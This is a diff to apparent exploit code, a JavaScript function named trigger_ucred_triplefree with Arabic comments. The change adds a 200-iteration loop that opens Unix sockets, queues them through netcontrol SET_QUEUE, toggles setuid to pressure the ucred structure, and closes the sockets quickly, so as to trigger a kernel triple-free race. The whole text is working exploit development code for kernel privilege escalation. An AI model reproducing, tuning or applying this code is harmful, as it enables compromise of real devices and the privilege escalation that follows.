@@ -1426,41 +1426,58 @@ function trigger_ucred_triplefree() {
   write64(msgIov.add(0x8), 1);
 
   var main_count = 0;
+  var global_run = 0;
+  var last_fd = -1;
+
   while (!end && main_count < TRIPLEFREE_ITERATIONS) {
     main_count++;
 
-    // عدّاد التشغيل (لو هتكرر البلوك)
-    var run_id = (typeof run_id === "undefined") ? 1 : (run_id + 1);
+    // عدّاد التشغيل الكلي
+    global_run++;
+    send_notification("===== GLOBAL RUN #" + global_run + " START =====");
 
-    send_notification("===== RUN #" + run_id + " START =====");
+    // عدد لفات الضغط
+    var LOOPS = 200; // لو عايز تزود، خليه 500 أو 1000
 
-    // 1) فتح dummy_socket
-    send_notification("[1] Opening dummy_socket...");
-    var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
-    send_notification("[1] dummy_socket FD = " + dummy_socket);
+    for (var i = 1; i <= LOOPS; i++) {
+        send_notification("---- LOOP #" + i + " ----");
 
-    // تسجيله في الـ queue
-    write32(nc_set_buf, Number(dummy_socket.and(0xFFFFFFFF)));
-    send_notification("[1] SET_QUEUE with FD = " + dummy_socket);
+        // 1) فتح dummy_socket
+        var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
+        send_notification("[1] dummy_socket FD = " + dummy_socket);
 
-    var r1 = netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
-    send_notification("[1] netcontrol(SET_QUEUE) ret = " + r1);
+        if (last_fd != -1) {
+            send_notification("[1] FD diff from last_fd = " + (dummy_socket - last_fd));
+        }
+        last_fd = Number(dummy_socket);
 
-    // إغلاق السوكت
-    close(new BigInt(dummy_socket));
-    send_notification("[1] dummy_socket closed");
+        // 2) تسجيله في الـ queue
+        write32(nc_set_buf, Number(dummy_socket.and(0xFFFFFFFF)));
+        var r1 = netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
+        send_notification("[1] netcontrol(SET_QUEUE dummy) ret = " + r1);
 
-    // 2) تغيير الهوية
-    send_notification("[2] Calling setuid(1)...");
-    setuid(1);
+        // 3) لعب سريع في الهوية
+        setuid(1);
+        setuid(0); // لو مسموح، علشان تزود الضغط على ucred
+        // لو مش مسموح ترجع 0، سيب setuid(1) بس
 
-    // 3) فتح socket جديد
-    send_notification("[3] Opening new socket...");
-    var new_socket = socket(AF_UNIX, SOCK_STREAM, 0);
-    send_notification("[3] new_socket FD = " + new_socket);
+        // 4) فتح سوكت تاني بسرعة من غير delay
+        var s2 = socket(AF_UNIX, SOCK_STREAM, 0);
+        send_notification("[2] second socket FD = " + s2 + " (diff from dummy = " + (s2 - dummy_socket) + ")");
 
-    // نهاية التشغيل
-    send_notification("===== RUN #" + run_id + " END =====");
+        // 5) تسجيل السوكت التاني في الـ queue
+        write32(nc_set_buf, Number(s2.and(0xFFFFFFFF)));
+        var r2 = netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
+        send_notification("[2] netcontrol(SET_QUEUE second) ret = " + r2);
+
+        // 6) قفل السوكتين بسرعة
+        close(new BigInt(dummy_socket));
+        close(new BigInt(s2));
+        send_notification("[3] both sockets closed");
+    }
+
+    send_notification("===== GLOBAL RUN #" + global_run + " END =====");
+
 
 
     // 6) refcount fix loop
